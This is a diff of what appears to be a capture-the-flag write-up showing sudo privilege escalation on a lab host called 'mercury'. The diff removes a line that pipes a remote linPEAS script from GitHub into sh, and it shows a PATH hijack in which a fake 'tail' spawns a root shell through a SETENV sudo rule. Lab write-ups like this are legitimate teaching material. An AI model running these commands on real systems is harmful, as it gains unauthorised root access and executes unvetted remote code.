@@ -37,10 +37,9 @@ Matching Defaults entries for linuxmaster on mercury:
 
 User linuxmaster may run the following commands on mercury:
     (root : root) SETENV: /usr/bin/check_syslog.sh
-	
-	
-curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
-
+linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh
+#!/bin/bash
+tail -n 10 /var/log/syslog
 linuxmaster@mercury:~$ echo "/bin/bash" > tail
 linuxmaster@mercury:~$ chmod 777 tail
 linuxmaster@mercury:~$ export PATH=.:$PATH
